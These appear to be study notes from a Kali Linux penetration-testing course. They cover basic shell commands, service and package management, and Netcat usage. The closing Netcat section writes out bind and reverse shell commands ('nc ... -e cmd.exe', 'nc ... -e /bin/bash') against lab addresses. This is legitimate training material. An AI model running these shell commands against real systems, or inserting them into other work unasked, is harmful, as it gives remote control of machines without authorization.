# Getting Comfortable with Kali
Kali Linux is developed, funded, and maintained by Offensive Security. It is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing. Kali contains several hundred tools that are geared toward various information

## Task 1 The Kali Menu
The Kali Linux menu includes categorical links for many of the tools present in the distribution. This structure helps clarify the primary role of each tool as well as the context for its usage.
Take some time to navigate the Kali Linux menus to help familiarize yourself with the available tools and their categories

## Task 2 Kali Documentation
As a full-blown operating system, Kali Linux offers many features and capabilities that we can not fully explore in this course. However, there are several official Kali Linux resources available for further research and study:
(Offensive Security, 2019), http://docs.kali.org
(Offensive Security, 2019), https://forums.kali.org
(Offensive Security, 2019), https://tools.kali.org
 (Offensive Security, 2019), https://bugs.kali.org
 (Offensive Security, 2019), https://kali.training


The Kali Linux Official Documentation
The Kali Docs website,28 as the name suggests, is the official Kali Linux documentation repository. This site presents the most current Kali documentation, details many common procedures, and should be considered the first stop for Kali Linux troubleshooting and support.
2.3.2 The Kali Linux Support Forum
The next stop for troubleshooting and support is the Kali Linux support forum.29 Before posting, read the forum rules and guidelines as non-compliant posts are often moderated or ignored. Before creating a new thread, be sure to thoroughly search the forums for a previously posted solution.
 The Kali Linux Tools Site
Kali features many penetration testing tools from various niches of the security and forensics fields. The Kali Tools site aims to list them all and provide a quick reference for each. The versions of the tools can be tracked against their upstream sources. In addition, information about each of the meta packages is also available. Metapackages provide the flexibility to install specific subsets of tools based on particular needs, including wireless, web applications, forensics, software-defined radio, and more.
 The Kali Linux Bug Tracker
Occasionally, certain tools may crash or produce unexpected results. When this happens, a search for the given error message on the Kali Linux Bug Tracker site might help determine whether or not the issue is a bug, and if it is, how it can be resolved. Users can also help the community by reporting bugs through the site.
 The Kali Training Site
The Kali Linux Training33 site hosts the official Kali Linux Manual and training course. This free site is based on the Kali Linux Revealed34 book and hosts the book content in HTML and PDF format, exercises to test your knowledge of the material, a support forum, and more. This site includes an abundance of useful information to help users get better acquainted with Kali Linux.

## Task 4 Man Pages
Next, let’s dig into Kali Linux usage and explore some basic Linux commands.
Most executable programs intended for the Linux command line provide a formal piece of documentation often called manual or man pages.
A special program called ةan is used to view these pages. Man pages generally have a name, a synopsis, a description of the command’s purpose, and the corresponding options, parameters, or switches. Let’s look at the man page for the ls command:
kali@kali:~$ man ls 
However, if we use the -k option with man, we can perform a keyword search as shown below:
kali@kali:~$ man -k passwd

## Task 5 apropos
With the apropos command, we can search the list of man page descriptions for a possible match based on a keyword. Although this is a bit crude, it’s often helpful for finding a particular command based on the description.
Let’s take a look at an example. Suppose that we want to partition a hard drive but can’t remember the name of the command. We can figure this out with an apropos search for “partition”.

kali@kali:~$ apropos partition

Notice that apropos seems to perform the same function as man -k; they are, in fact, equivalent.

## Task 6 Listing Files
The ls command prints out a basic file listing to the screen. We can modify the output results
with various wildcards. The -a option is used to display all files (including hidden ones) and the -1
option displays each file on a single line, which is very useful for automation.

kali@kali:~$ ls
kali@kali:~$ ls -a1

## Task 7 Moving Around
Linux does not use Windows-style drive letters. Instead, all files, folders, and devices are children of the root directory, represented by the “/” character. We can use the cd command followed by a path to change to the specified directory.

The pwd command will print the current directory (which is helpful if you get lost) and running cd ~ will return to the home directory.

kali@kali:~$ cd /usr/share/metasploit-framework/

kali@kali:/usr/share/metasploit-framework$ pwd

kali@kali:/usr/share/metasploit-framework$ cd ~

kali@kali:~$ pwd


## Task 8 Creating Directories
The mkdir command followed by the name of a directory creates the specified directory.
Directory names can contain spaces but since we will be spending a lot of time at the command line, we’ll save ourselves a lot of trouble by using hyphens or underscores instead. These characters will make auto-completes (executed with the A key) much easier to complete.

kali@kali:~$ mkdir notes

kali@kali:~$ cd notes/

kali@kali:~/notes$ mkdir module one

kali@kali:~/notes$ ls

kali@kali:~/notes$ rm -rf module/ one/

kali@kali:~/notes$ mkdir "module one"

kali@kali:~/notes$ cd module\ one/

We can create multiple directories at once with the incredibly useful mkdir -p, which will also create any required parent directories. This can be combined with brace expansion to efficiently create a directory structure to, for example, store your penetration test notes.
In the example below, we are creating a directory called test and within that directory, creating three subdirectories called recon, exploit, and report:

kali@kali:~$ mkdir -p test/{recon,exploit,report}
kali@kali:~$ ls -1 test/

## Task 9 Finding Files in Kali Linux
The which command searches through the directories that are defined in the $PATH
environment variable for a given file name. This variable contains a listing of directories that Kali
searches when a command is issued without its path. If a match is found, which returns the full
path to the file as shown below:

kali@kali:~$ echo $PATH
kali@kali:~$ which sbd


locate
------
The locate command is the quickest way to find the locations of files and directories in Kali. In
order to provide a much shorter search time, locate searches a built-in database named
locate.db rather than the entire hard disk itself. This database is automatically updated on a
regular basis by the cron scheduler. To manually update the locate.db database, you can use the
updatedb command.

kali@kali:~$ sudo updatedb
kali@kali:~$ locate sbd.exe


find
----
The find command is the most complex and flexible search tool among the three. Mastering its
syntax can sometimes be tricky, but its capabilities go beyond a normal file search. The most
basic usage of the find command is shown in Listing , where we perform a recursive search
starting from the root file system directory and look for any file that starts with the letters “sbd”.
kali@kali:~$ sudo find / -name sbd*

The main advantage of find over locate is that it can search for files and directories by more
than just the name. With find, we can search by file age, size, owner, file type, timestamp,

## Task 10 Managing Kali Linux Services
Kali Linux is a specialized Linux distribution aimed at security professionals. As such, it contains
several non-standard features. The default Kali installation ships with several services
preinstalled, such as SSH, HTTP, MySQL, etc. Consequently, these services would load at boot
time, which would result in Kali exposing several open ports by default–something we want to
avoid for security reasons. Kali deals with this issue by updating its settings to prevent network
services from starting at boot time.
Kali also contains a mechanism to both whitelist and blacklist various services. The following
sections will discuss some of these services, as well as how to operate and manage them.


SSH Service
----------------
The Secure SHell (SSH) service is most commonly used to remotely access a computer, using a
secure, encrypted protocol. The SSH service is TCP-based and listens by default on port 22. To
start the SSH service in Kali, we run systemctl with the start option followed by the service
name (ssh in this example):

kali@kali:~$ sudo systemctl start ssh

When the command completes successfully, it does not return any output but we can verify that
the SSH service is running and listening on TCP port 22 by using the ss command and piping the
output into grep to search the output for “sshd”:

kali@kali:~$ sudo ss -antlp | grep sshd

If we want to have the SSH service start automatically at boot time (as many users prefer), we
simply enable it using the systemctl command. However, be sure to change the default
password first!

kali@kali:~$ sudo systemctl enable ssh


HTTP Service
-------------
The Apache HTTP service is often used during a penetration test, either for hosting a site, or
providing a platform for downloading files to a victim machine. The HTTP service is TCP-based
and listens by default on port 80. To start the HTTP service in Kali, we can use systemctl as we
did when starting the SSH service, replacing the service name with “apache2”:

kali@kali:~$ sudo systemctl start apache2

As with the SSH service, we can verify that the HTTP service is running and listening on TCP port
80 with the ss and grep commands.

kali@kali:~$ sudo ss -antlp | grep apache

To have the HTTP service start at boot time, much like with the SSH service, we need to explicitly
enable it with systemctl and its enable option:

kali@kali:~$ sudo systemctl enable apache2


Most services in Kali Linux are operated in much the same way as SSH and HTTP, through their
service or init scripts. To see a table of all available services, run systemctl with the list-unitfiles option:

kali@kali:~$ systemctl list-unit-files


## Task 11 Searching, Installing, and Removing Tools
The Kali VMware image contains the most common tools used in the field of penetration testing. However, it is not practical to include every single tool present in the Kali repository in the VMware image. Therefore, we’ll need to discuss how to search for, install, or remove tools. In this section, we will be exploring the Advanced Package Tool (APT) toolset as well as other commands that are useful in performing maintenance operations on the Kali Linux OS. APT is a set of tools that helps manage packages, or applications, on a Debian based system. Since Kali is based on Debian,45 we can use APT to install and remove applications, update packages, and even upgrade the entire system. The magic of APT lies in the fact that it is a complete package management system that installs or removes the requested package by recursively satisfying its requirements and dependencies.

apt update
--------------
Information regarding APT packages is cached locally to speed up any sort of operation that
involves querying the APT database. Therefore, it is always good practice to update the list of
available packages, including information related to their versions, descriptions, etc. We can do
this with the apt update command as follows:

kali@kali:~$ sudo apt update


apt upgrade
-------------------
After the APT database has been updated, we can upgrade the installed packages and core
system to the latest versions using the apt upgrade command.
In order to upgrade a single package, add the package name after the apt upgrade command
such as apt upgrade metasploit-framework.


"While you can upgrade your Kali Linux installation at any time, it’s a good idea to take a snapshot of the virtual machine in a clean state (before any changes have been made) before doing so. This has two major benefits. First of all, it will ensure that you have a snapshot of a tested build that will work for all exercises and secondly, if you encounter issues and have to contact our support team, they will know the versions of tools you are using and how they behave. For an actual penetration test, these same concerns will apply. You will learn more about how to balance having the newest tools with having a trusted build as you gain more experience and familiarity with Kali Linux."



apt-cache search and apt show
------------------------------------------------
The apt-cache search command displays much of the information stored in the internal cached package database. For example, let’s say we would like to install the pure-ftpd application via APT. The first thing we have to do is to find out whether or not the application is present in the Kali Linux repositories. To do so, we would proceed by passing the search term on the command line:

kali@kali:~$ apt-cache search pure-ftpd


The output above indicates that the application is present in the repository. There are also a few
authentication extensions for the pure-ftpd application that may be installed if needed.
Interestingly enough, the resource-agents package is showing up in our search even though its
name does not contain the “pure-ftpd” keyword. The reason behind this is that apt-cache
search looks for the requested keyword in the package’s description rather than the package name itself.
To confirm that the resource-agents package description really contains the “pure-ftpd” keyword,
pass the package name to apt show as follows:

kali@kali:~$ apt show resource-agents

In the output above, apt show clarifies why the resource-agents application was mysteriously
showing up in the previous search for pure-ftpd.


apt install
-------------
The apt install command can be used to add a package to the system with apt install
followed by the package name. Let’s continue with the installation of pure-ftpd:

kali@kali:~$ sudo apt install pure-ftpd

Similarly, we can remove a package with the command apt remove --purge


apt remove --purge
----------------------------
The apt remove –purge command completely removes packages from Kali. It is important to
note that removing a package with apt remove removes all package data, but leaves usually
small (modified) user configuration files behind, in case the removal was accidental. Adding the -
-purge option removes all the leftovers

kali@kali:~$ sudo apt remove --purge pure-ftpd

Excellent! You are now able to search, install, upgrade and remove tools in Kali Linux. Let’s
explore one last command in this module: dpkg.

dpkg
-------
dpkg is the core tool used to install a package, either directly or indirectly through APT. It is also
the preferred tool to use when operating offline, since it does not require an Internet connection.
Note that dpkg will not install any dependencies that the package might require. To install a
package with dpkg, provide the -i or --install option and the path to the .deb package file.
This assumes that the .deb file of the package to install has been previously downloaded or
obtained in some other way.

kali@kali:~$ sudo dpkg -i man-db_2.7.0.2-5_amd64.deb

# Command Line Fun

## Task 1 The Bash Environment
Bash is an sh-compatible shell that allows us to run complex commands and perform different tasks from a terminal window. It incorporates useful features from both the KornShell (ksh) and C shell (csh).

Environment Variables
-------------------------
When opening a terminal window, a new Bash process, which has its own environment variables, is initialized. These variables are a form of global storage for various settings inherited by any applications that are run during that terminal session. One of the most commonly-referenced environment variables is PATH, which is a colon-separated list of directory paths that Bash will search through whenever a command is run without a full path.

We can view the contents of a given environment variable with the echo command followed by the “$” character and an environment variable name. For example, let’s take a look at the contents of the PATH environment variable:

kali@kali:~$ echo $PATH

Some other useful environment variables include USER, PWD, and HOME, which hold the values of the current terminal user’s username, present working directory, and home directory respectively:

kali@kali:~$ echo $USER

kali@kali:~$ echo $PWD

kali@kali:~$ echo $HOME

An environment variable can be defined with the export command. For example, if we are scanning a target and don’t want to type in the system’s IP address repeatedly, we can quickly assign it an environment variable and use that instead:

kali@kali:~$ export b=10.11.1.220

kali@kali:~$ ping -c 2 $b


The export command makes the variable accessible to any subprocesses we might spawn from our current Bash instance. If we set an environment variable without export it will only be available in the current shell. We will use the $$ variable to display the process ID of the current shell instance to make sure that we are indeed issuing commands in two different shells:

kali@kali:~$ echo "$$

kali@kali:~$ var="My Var"

kali@kali:~$ echo $var

kali@kali:~$ bash

kali@kali:~$ echo "$$"

kali@kali:~$ echo $var

kali@kali:~$ exit

kali@kali:~$ echo $var

kali@kali:~$ export othervar="Global Var"

kali@kali:~$ echo $othervar

kali@kali:~$ bash

kali@kali:~$ echo $othervar

kali@kali:~$ exit

There are many other environment variables defined by default in Kali Linux. We can view these by running env at the command line:

kali@kali:~$ env


Task 2 Tab Completion
The Bash shell auto-complete function allows us to complete filenames and directory paths with the A key. This feature accelerates shell usage so much that it is sorely missed in other shells. Let’s take a look at how this works from the kali user home directory. We’ll start by typing the following command:
kali@kali:~$ ls D[TAB]
kali@kali:~$ ls De[TAB]sktop/
When we hit the A key the first time after “D”, the Bash shell suggests that there are three directories starting with that letter then presents our partially completed command for us to continue. Since we decide to specify “Desktop”, we then proceed to type “e” followed by the A key a second time. At this point the Bash shell magically auto-completes the rest of the word “Desktop” as this is the only choice that starts with “De”. Additional information about Tab Completion can be found on the Debian website

## Task 3 Bash History Tricks
While working on a penetration test, it’s important to keep a record of commands that have been entered into the shell. Fortunately, Bash maintains a history of commands that have been entered, which can be displayed with the history command.
kali@kali:~$ history
Rather than re-typing a long command from our history, we can make use of the history expansion facility. For example, looking back at Listing , there are three commands in our history with a line number preceding each one. To re-run the first command, we simply type the ! character followed by the line number, in this case 1, to execute the cat /etc/lsb-release command:

kali@kali:~$ !1

Another helpful history shortcut is !!, which repeats the last command that was executed during our terminal session:

kali@kali:~$ sudo systemctl restart apache2
kali@kali:~$ !!

By default, the command history is saved to the .bash_history file in the user home directory. Two environment variables control the history size: HISTSIZE and HISTFILESIZE.

HISTSIZE controls the number of commands stored in memory for the current session and HISTFILESIZE configures how many commands are kept in the history file. These variables can be edited according to our needs and saved to the Bash configuration file (.bashrc) that we will explore later.

One of the simplest ways to explore the Bash history is right from the command line prompt. We can browse through the history with some useful keyboard shortcuts with the two most common being:

 

Last but not least, holding down CTRL and pressing R will invoke the reverse-i-search facility. Type a letter, for example, c, and you will get a match for the most recent command in your history that contains the letter “c”. Keep typing to narrow down your match and when you find the desired command, press Enter to execute it.

kali@kali:~$ [CTRL-R]c


Task 4 Piping and Redirection
Every program run from the command line has three data streams connected to it that serve as communication channels with the external environment. These streams are defined as follows:
Piping and Redirection
-----------------------------------
 

Piping (using the | operator) and redirection (using the > and < operators) connects these streams between programs and files to accommodate a near infinite number of possible use cases
Redirecting to a New File
----------------------------------------
In the previous command examples, the output was printed to the screen. This is convenient most of the time, but we can use the > operator to save the output to a file to keep it for future reference or manipulation:
kali@kali:~$ ls
kali@kali:~$ echo "test"
kali@kali:~$ echo "test" > redirection_test.txt
kali@kali:~$ ls
kali@kali:~$ cat redirection_test.txt
kali@kali:~$ echo "Kali Linux is an open source project" > redirection_test.txt
kali@kali:~$ cat redirection_test.txt
As shown in Listing , if we redirect the output to a non-existent file, the file will be created automatically. However, if we save the output to a file that already exists, that file’s content will be replaced. Be careful with redirection! There is no undo function!

Redirecting to an Existing File
---------------------------------------------
To append additional data to an existing file (as opposed to overwriting the file) use the >> operator:
kali@kali:~$ echo "that is maintained and funded by Offensive Security" >> redirection_test.txt
kali@kali:~$ cat redirection_test.txt

Piping
----------
Continuing with the example using the wc command, let’s have a look at how to redirect the output from one command into the input of another. Consider this example:
kali@kali:~$ cat error.txt
kali@kali:~$ cat error.txt | wc -m
kali@kali:~$ cat error.txt | wc -m > count.txt
kali@kali:~$ cat count.txt
we used the pipe character (|) to redirect the output of the cat command to the input of the wc command. This concept may seem trivial but piping together different commands is a powerful tool for manipulating all sorts of data.

Task 5 Text Searching and Manipulation
In this section, we will gain efficiency with file and text handling by introducing a few commands: grep, sed, cut, and awk. Advanced usage of some of these tools requires a good understanding of how regular expressions (regex) work. A regular expression is a special text string for describing a search pattern. If you are unfamiliar with regular expressions, visit the following URLs before continuing:
• http://www.rexegg.com/
• http://www.regular-expressions.info/
grep
---------
In a nutshell, grep searches text files for the occurrence of a given regular expression and outputs any line containing a match to the standard output, which is usually the terminal screen.
Some of the most commonly used switches include -r for recursive searching and -i to ignore text case. Consider the following example:
kali@kali:~$ ls -la /usr/bin | grep zip
we listed all the files in the /usr/bin directory with ls and pipe the output into the grep command, which searches for any line containing the string “zip”. Understanding the grep tool and when to use it can prove incredibly useful.
sed
----
sed is a powerful stream editor. It is also very complex so we will only briefly scratch its surface here. At a very high level, sed performs text editing on a stream of text, either a set of specific files or standard output. Let’s look at an example:

kali@kali:~$ echo "I need to try hard" | sed 's/hard/harder/'

we created a stream of text using the echo command and then piped it to sed in order to replace the word “hard” with “harder”. Note that by default the output has been automatically redirected to the standard output
cut
-----
The cut58 command is simple, but often comes in quite handy. It is used to extract a section of text from a line and output it to the standard output. Some of the most commonly-used switches include -f for the field number we are cutting and -d for the field delimiter.
kali@kali:~$ echo "I hack binaries,web apps,mobile apps, and just about anything else" | cut -f 2 -d ","
we echoed a line of text and piped it to the cut command to extract the second field using a comma (,) as the field delimiter. The same command can be used with lines in text files as shown below, where a list of users is extracted from /etc/passwd by using : as a delimiter and retrieving the first field
kali@kali:~$ cut -d ":" -f 1 /etc/passwd

awk
-------
AWK is a programming language designed for text processing and is typically used as a data extraction and reporting tool. It is also extremely powerful and can be quite complex, so we will only scratch the surface here. A commonly used switch with awk60 is -F, which is the field separator, and the print command, which outputs the result text.

kali@kali:~$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'

we echoed a line and piped it to awk to extract the first ($1) and third ($3) fields using :: as a field separator. The most prominent difference between the cut and awk examples we used is that cut can only accept a single character as a field delimiter, while awk, , is much more flexible. As a general rule of thumb, when you start having a command involving multiple cut operations, you may want to consider switching to awk.



Task 6 Editing Files from the Command Line
Next, let’s take a look at file editing in a command shell environment. This is an extremely important Linux skill, especially during a penetration test if you happen to get access to a Unix-like OS.
Although there are text editors like gedit61 and leafpad62 that might be more visually appealing due to their graphical user interface,63 we will focus on text-based terminal editors, which emphasize both speed and versatility. Everyone seems to have a preference when it comes to text editors, but we will cover basic usage for the two most common options: nano and vi.
nano
-------
Nano is one of the simplest-to-use text editors. To open a file and begin editing, simply run nano, passing a filename as an optional argument:
kali@kali:~$ nano intro_to_nano.txt
 

 


vi
---

 

vi is an extremely powerful text editor, capable of blazing speed especially when it comes to automating repetitive tasks. However, it has a relatively steep learning curve and is nowhere near as simple to use as Nano. Due to its complexity, we will only cover the very basics. As with nano, to edit a file, simply pass its name as an argument to vi:
kali@kali:~$ vi intro_to_vi.txt
Once the file is opened, enable insert-text mode to begin typing. To do this, press the i key and start typing away
 

 

Because vi seems so awkward to use, many users avoid it. However, from a penetration tester’s point of view, vi can save a great deal of time in the hands of an experienced user and vi is installed on every POSIX-compliant system. Feel free to dig deeper on your own; vi is quite powerful. For more information, refer to the following URLs:

• https://en.wikibooks.org/wiki/Learning_the_vi_Editor/vi_Reference
• https://www.debian.org/doc/manuals/debian-tutorial/ch-editor.html






## Task 7 Comparing Files
File comparison may seem irrelevant, but system administrators, network engineers, penetration testers, IT support technicians and many other technically-oriented professionals rely on this skill pretty often.

comm
----------

The comm command compares two text files, displaying the lines that are unique to each one, as well as the lines they have in common. It outputs three space-offset columns: the first contains lines that are unique to the first file or argument; the second contains lines that are unique to the second file or argument; and the third column contains lines that are shared by both files. The -n switch, where “n” is either 1, 2, or 3, can be used to suppress one or more columns, depending on the need. Let’s take a look at an example:

kali@kali:~$ cat scan-a.txt

kali@kali:~$ cat scan-b.txt

kali@kali:~$ comm scan-a.txt scan-b.txt

kali@kali:~$ comm -12 scan-a.txt scan-b.txt


In the example above , comm displayed the unique lines in scan-a.txt, the unique lines in scan-b.txt and the lines found in both files respectively. In the second example, comm -12 displayed only the lines that were found in both files since we suppressed the first and second columns


## Task 8 Managing Processes
The Linux kernel manages multitasking through the use of processes. The kernel maintains information about each process to help keep things organized, and each process is assigned a number called a process ID (PID).

The Linux shell also introduces the concept of jobs to ease the user’s workflow during a terminal session. As an example, cat error.txt | wc -m is a pipeline of two processes, which the shell considers a single job. Job control refers to the ability to selectively suspend the execution of jobs and resume their execution at a later time. This can be achieved through the help of specific commands, which we will soon explore.

Backgrounding Processes (bg)
------------------------------------------------

The previous jobs in this module have been run in the foreground, which means the terminal is occupied and no other commands can be executed until the current one finishes. Since most of our examples have been short and sweet, this hasn’t caused a problem. We will, however, be running longer and more complex commands in later modules that we can send to the background in order to regain control of the terminal and execute additional commands. The quickest way to background a process is to append an ampersand (&) to the end of the command to send it to the background immediately after it starts. Let’s try a brief example:

kali@kali:~$ ping -c 400 localhost > ping_results.txt &

we sent 400 ICMP echo requests to the local interface with the ping command and wrote the results to a file called ping_results.txt.
The execution automatically runs in the background, leaving the shell free for additional operations.

But what would have happened if we had forgotten to append the ampersand at the end of the command? The command would have run in the foreground, and we would be forced to either cancel the command with C c or wait until the command finishes to regain control of the terminal. The other option is to suspend the job using C z after it has already started. Once a job has been suspended, we can resume it in the background by using the bg command:

kali@kali:~$ ping -c 400 localhost > ping_results.txt

kali@kali:~$ bg

"Using bg to background a job"

The job is now running in the background and we can continue using the terminal as we wish. While doing this, keep in mind that some processes are time sensitive and may give incorrect results if left suspended too long. For instance, in the ping example, the echo reply may come back but if the process is suspended when the packet comes in, the process may miss it, leading to incorrect output. Always consider the context of what the commands you are running are doing when engaging in job control


Jobs Control: jobs and fg
-------------------------------------------

To quickly check on the status of our ICMP echo requests, we need to make use of two additional commands: jobs and fg.

The built-in jobs utility lists the jobs that are running in the current terminal session, while fg returns a job to the foreground. These commands are shown in action below:

kali@kali:~$ ping -c 400 localhost > ping_results.txt

kali@kali:~$ find / -name sbd.exe

kali@kali:~$ jobs

kali@kali:~$ fg %1

kali@kali:~$ jobs

kali@kali:~$ fg

"Using jobs to look at jobs and fg to bring one into the foreground"

There are a few things worth mentioning

First, the odd ^C character represents the keystroke combination C c. We can use this shortcut to terminate a long-running process and regain control of the terminal. 

Second, the use of “%1” in the fg%1 command is new. There are various ways to refer to a job in the shell. The “%” character followed by a Job ID represents a job specification. The Job ID can be a process ID (PID) number or you can use one of the following symbol combinations:


• %Number : Refers to a job number such as %1 or %2
• %String : Refers to the beginning of the suspended command’s name such as %commandNameHere or %ping
• %+ OR %% : Refers to the current job
• %- : Refers to the previous job

Note that if only one process has been backgrounded, the job number is not needed.


Process Control: ps and kill
--------------------------------------

One of the most useful commands to monitor processes on mostly any Unix-like operating system is ps (short for process status). Unlike the jobs command, ps lists processes systemwide, not only for the current terminal session. This utility is considered a standard on Unix-like
 OSes and its name is so well-recognized that even on Windows PowerShell, ps is a predefined command alias for the Get-Process cmdlet, which essentially serves the same purpose.

As a penetration tester, one of the first things to check after obtaining remote access to a system is to understand what software is currently running on the compromised machine. This could help us elevate our privileges or collect additional information in order to acquire further access into the network.

As an example, let’s start the Leafpad text editor and then try to find its process ID (PID) from the command line by using the ps command

kali@kali:~$ ps -ef

" Common ps syntax to list all the processes currently running "

The -ef options we used above stand for:
• e: select all processes
• f: display full format listing (UID, PID, PPID, etc.)

Finding our Leafpad application in that massive listing is definitely not easy, but since we know the application name we are looking for, we can replace the -e switch with -C (select by command name) as follows:

kali@kali:~$ ps -fC leafpad

" Narrowing down our search by specifying the process name "


the process search has returned a single result from which we gathered Leafpad’s PID. Take some time to explore the command manual (man ps), as ps is really the Swiss Army knife of process management.

Let’s say we now want to stop the Leafpad process without interacting with the GUI. The kill command can help us here, as its purpose is to send a specific signal to a process. In order to

use kill, we need the PID of the process we want to send the signal to. Since we gathered Leafpad’s PID in the previous step, we can proceed:

kali@kali:~$ kill 1307






## Task 9 File and Command Monitoring
It is extremely valuable to know how to monitor files and commands in real-time during the course of a penetration test. Two commands that help with such tasks are tail and watch.
tail
-------
The most common use of tail75 is to monitor log file entries as they are being written. For example, we may want to monitor the Apache logs to see if a web server is being contacted by a given client we are attempting to attack via a client-side exploit. This example will do just that:
kali@kali:~$ sudo tail -f /var/log/apache2/access.log


" Monitoring the Apache log file using tail command. "

The -f option (follow) is very useful as it continuously updates the output as the target file grows. Another convenient switch is -nX, which outputs the last “X” number of lines, instead of the default value of 10.


watch
----------
The watch76 command is used to run a designated command at regular intervals. By default, it runs every two seconds but we can specify a different interval by using the -n X option to have it run every “X” number of seconds. For example, this command will list logged-in users (via the w command) once every 5 seconds:
kali@kali:~$ watch -n 5 w

" Monitoring logged in users using the watch command. "


Task 10 Downloading Files
Next, let’s take a look at some tools that can download files to a Linux system from the command line

wget
------
The wget command, which we will use extensively, downloads files using the HTTP/HTTPS and FTP protocols. 

the use of wget along with the -O switch to save the destination file with a different name on the local machine:

kali@kali:~$ wget -O report_wget.pdf https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf

" Downloading a file through wget "

curl
-----

curl is a tool to transfer data to or from a server using a host of protocols including IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, and others. A penetration tester can use this to download or upload files and build complex requests. Its most basic use is very similar to wget:

kali@kali:~$ curl -o report.pdf https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf

"  Downloading a file with curl "

axel
-----

axel is a download accelerator that transfers a file from a FTP or HTTP server through multiple connections. This tool has a vast array of features, but the most common is -n, which is used to specify the number of multiple connections to use. In the following example, we are also using the -a option for a more concise progress indicator and -o to specify a different file name for the downloaded file.

kali@kali:~$ axel -a -n 20 -o report_axel.pdf https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf

" Downloading a file with axel "

Practical Tools

Task 1 Netcat

Netcat, first released in 1995(!) by *Hobbit* is one of the “original” network penetration testing tools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”. The clearest definition of Netcat is from *Hobbit* himself: a simple “utility which reads and writes data across network connections, using TCP or UDP protocols

Connecting to a TCP/UDP Port
---------------------------------------------
As suggested by the description, Netcat can run in either client or server mode. To begin, let’s look
at the client mode.

We can use client mode to connect to any TCP/UDP port, allowing us to:
• Check if a port is open or closed.
• Read a banner from the service listening on a port.
• Connect to a network service manually.

Let’s begin by using Netcat (nc) to check if TCP port 110 (the POP3 mail service) is open on one of the lab machines. We will supply several arguments: the -n option to skip DNS name resolution; -v to add some verbosity; the destination IP address; and the destination port number:

kali@kali:~$ nc -nv 10.11.0.22 110
"Using nc to connect to a TCP port"

Listening on a TCP/UDP Port
-------------------------------------------
Listening on a TCP/UDP port using Netcat is useful for network debugging of client applications, or otherwise receiving a TCP/UDP network connection. Let’s try implementing a simple chat service involving two machines, using Netcat both as a client and as a server. On a Windows machine with IP address 10.11.0.22, we set up Netcat to listen for incoming connections on TCP port 4444. We will use the -n option to disable DNS name resolution, -l to create a listener, -v to add some verbosity, and -p to specify the listening port number:
C:\Users\offsec> nc -nlvp 4444
"Using nc to set up a listener"
Now that we have bound port 4444 on this Windows machine to Netcat, let’s connect to that port from our Linux machine and enter a line of text:
kali@kali:~$ nc -nv 10.11.0.22 4444
Our text will be sent to the Windows machine over TCP port 4444 and we can continue the “chat” from the Windows machine:
C:\Users\offsec> nc -nlvp 4444

Transferring Files with Netcat
------------------------------------------

Netcat can also be used to transfer files, both text and binary, from one computer to another. In fact, forensics investigators often use Netcat in conjunction with dd (a disk copying utility) to create forensically sound disk images over a network. To send a file from our Kali virtual machine to the Windows system, we initiate a setup that is similar to the previous chat example, with some slight differences. On the Windows machine, we will set up a Netcat listener on port 4444 and redirect any output into a file called incoming.exe:

C:\Users\offsec> nc -nlvp 4444 > incoming.exe

" Using nc to receive a file "

On the Kali system, we will push the wget.exe file to the Windows machine through TCP port 4444:

kali@kali:~$ locate wget.exe

/usr/share/windows-resources/binaries/wget.exe

kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe

" Using nc to transfer a file "

The connection is received by Netcat on the Windows machine as shown below:

C:\Users\offsec> nc -nlvp 4444 > incoming.exe

" Connection received on Windows "


Netcat Bind Shell Scenario
--------------------------------------------

In our first scenario, Bob (running Windows) has requested Alice’s assistance (who is running Linux) and has asked her to connect to his computer and issue some commands remotely. Bob has a public IP address and is directly connected to the Internet.

Alice, however, is behind a NATed connection, and has an internal IP address. To complete the scenario, Bob needs to bind cmd.exe to a TCP port on his public IP address and asks Alice to connect to his particular IP address and port.

Bob will check his local IP address, then run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port:

C:\Users\offsec> ipconfig

C:\Users\offsec> nc -nlvp 4444 -e cmd.exe

" Using nc to set up a bind shell "

Now Netcat has bound TCP port 4444 to cmd.exe and will redirect any input, output, or error messages from cmd.exe to the network. In other words, anyone connecting to TCP port 4444 on Bob’s machine (hopefully Alice) will be presented with Bob’s command prompt. This is indeed a “gaping security hole”!

kali@kali:~$ ip address show eth0 | grep inet

kali@kali:~$ nc -nv 10.11.0.22 4444

" Using nc to connect to a bind shell "

 


Reverse Shell Scenario
-------------------------------------

In our second scenario, Alice needs help from Bob. However, Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her internal machine. In this scenario, we can leverage another useful feature of Netcat; the ability to send a command shell to a host listening on a specific port. In this situation, although Alice cannot bind a port to /bin/bash locally on her computer and expect Bob to connect, she can send control of her command prompt to Bob’s machine instead. This is known as a reverse shell. To get this working, Bob will first set up Netcat to listen for an incoming shell. We will use port 4444 in our example:

C:\Users\offsec> nc -nlvp 4444

" Using nc to set up a listener in order to receive a reverse shell "

Now, Alice can send a reverse shell from her Linux machine to Bob. Once again, we use the -e option to make an application available remotely, which in this case happens to be /bin/bash, the Linux shell:

kali@kali:~$ ip address show eth0 | grep inet

kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash

" Using nc to send a reverse shell "

Once the connection is established, Alice’s Netcat will have redirected /bin/bash input, output, and error data streams to Bob’s machine on port 4444, and Bob can interact with that shell:

C:\Users\offsec>nc -nlvp 4444

ip address show eth0 | grep inet


Take some time to consider the differences between bind and reverse shells, and how these differences may apply to various firewall configurations from an organizational security standpoint. It is important to realize that outgoing traffic can be just as harmful as incoming traffic. The following image depicts the reverse shell scenario where Bob gets remote shell access on Alice’s Linux machine, traversing the corporate firewall:
